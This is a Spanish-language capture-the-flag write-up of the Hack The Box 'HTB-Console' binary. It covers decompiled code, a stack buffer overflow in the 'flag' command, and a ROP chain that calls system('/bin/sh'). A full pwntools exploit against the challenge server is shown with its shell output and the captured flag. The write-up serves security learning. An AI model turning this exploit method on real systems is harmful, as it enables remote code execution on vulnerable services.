# HTB-Console

EL binario aparentemente es una consola bastante limitada:
```console
└─$ ./htb-console
Welcome HTB Console Version 0.1 Beta.
>> whoami
Unrecognized command.
>> help
Unrecognized command.
>>
Unrecognized command.
>> ls
- Boxes
- Challenges
- Endgames
- Fortress
- Battlegrounds
>> cd Endgames
Unrecognized command.
>> exit
Unrecognized command.
>> ^C
```

En Ghidra vemos que no hay funcion main sino otras (he renombrado funciones para que se entienda todo mejor):
```c
void main(void){
  char comando [16];
  puts("Welcome HTB Console Version 0.1 Beta.");
  do {
    printf(">> ");
    fgets(comando,0x10,stdin);
    console(comando);
    memset(comando,0,0x10);
  } while( true );}
 
void console(char *comando) {
  int comando_valido;
  char buffer [16];
  comando_valido = strcmp(comando,"id\n");
  if (comando_valido == 0) {
    puts("guest(1337) guest(1337) HTB(31337)");}
  else {
    comando_valido = strcmp(comando,"dir\n");
    if (comando_valido == 0) {
      puts("/home/HTB");}
    else {
      comando_valido = strcmp(comando,"flag\n");
      if (comando_valido == 0) {
        printf("Enter flag: ");
        fgets(buffer,0x30,stdin);
        puts("Whoops, wrong flag!");
      }
      else {
        comando_valido = strcmp(comando,"hof\n");
        if (comando_valido == 0) {
          puts("Register yourself for HTB Hall of Fame!");
          printf("Enter your name: ");
          fgets(&NAME,10,stdin);
          puts("See you on HoF soon! :)");
        }
        else {
          comando_valido = strcmp(comando,"ls\n");
          if (comando_valido == 0) {
            puts("- Boxes");
            puts("- Challenges");
            puts("- Endgames");
            puts("- Fortress");
            puts("- Battlegrounds");}
      	  else {
            comando_valido = strcmp(comando,"date\n");
            if (comando_valido == 0) {
              system("date");}
            else {
              puts("Unrecognized command.");
            };};}
  return;}
```

Probando cada uno de los comandos intentaremos causar un segfault:

1. Pruebo a meter como comando muchas AAAAA # -> Unrecognized command.
2. Comando "hof"
```
>> hof  
Register yourself for HTB Hall of Fame!
Enter your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
See you on HoF soon! :)
```
3. Comando flag:
```
>> flag
Enter flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Whoops, wrong flag!
zsh: segmentation fault  ./htb-console
```

Por tanto es por flag por donde está la avería.


gef➤  pattern create 50
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
-------------------------------------------
$rsp   : 0x007fffffffdf58  →  "daaaaaaaeaaaaaaafaaaaaa"
$rbp   : 0x6161616161616163 ("caaaaaaa"?)
gef➤  aga    # ESto lo ha puesto ello solo
Undefined command: "aga".  Try "help".

gef➤  pattern offset $rsp
[+] Searching for '$rsp'
[+] Found at offset 24 (little-endian search) likely
(└─$ echo "daaaaaaaeaaaaaaafaaaaaa" | wc -c   # -> 24)

Dentro de "flag" -> 24 bytes hasta dar con el RSP (puntero de instrucción)


Como es un stripped binary, no está llamando a libc sino que la tiene cargada directamente en sí mismo, así que
el ret2libc cambia mucho. Por ejemplo la string "bin/sh" no está incluida en el binario sino solo "date" para 
system (se ve en el código arriba)

pop rdi + "/bin/sh" + system

1. Hay que buscar donde tiene el binario la llamada a system (no libc sino el binario en si, cargado en la plt
como si fuera un printf)
```console
└─$ objdump -D htb-console | grep "system"
0000000000401040 <system@plt>:
  401381:	e8 ba fc ff ff       	call   401040 <system@plt>
```
2. Buscar el gadget para abrir el registro que le pasara un arumgneto a la funcion system
```console
└─$ ropper --search  "pop rdi" -f ./htb-console 
0x0000000000401473: pop rdi; ret;
```

A diferencia de los ret2libc normales que buscabamos "bin/sh" dentro de libc  importado ahora como no importa nada
no se puede y en el binario solo llama system a "date".

Digamos que hay que escribir ese "bin/sh" en otro lugar ¿Pero dónde?
En el comando "hof" (hall of fame) nos piden un nombre y lo meten en una variable.
En ghidra, si clicamos a la función &NAME (si no se cambio es DAT_004040B0) y nos da su dirección -> 4040b0

>> hof
Enter your name: bin/sh
See you on HoF soon! :)
C^

gef➤  x/s 0x4040b0
0x4040b0:	"/bin/sh\n"

```python
from pwn import *
proc = remote("138.68.143.219", "32537")

proc.sendline('hof')
name = b'/bin/sh'
proc.sendline(name)

proc.sendline('flag')
pop_rdi = p64(0x00401473);  bin_sh = p64(0x004040b0); system = p64(0x00401040);
payload = b"A"*24 + pop_rdi + bin_sh + system
proc.sendline(payload)

proc.interactive()
```

```console
└─$ python3 exploit.py 2>/dev/null
[+] Opening connection to 138.68.143.219 on port 32537: Done
[*] Switching to interactive mode
 Whoops, wrong flag!
$ ls
console
core
flag.txt
$ cat flag.txt
HTB{fl@g_a$_a_s3rv1c3?}
```
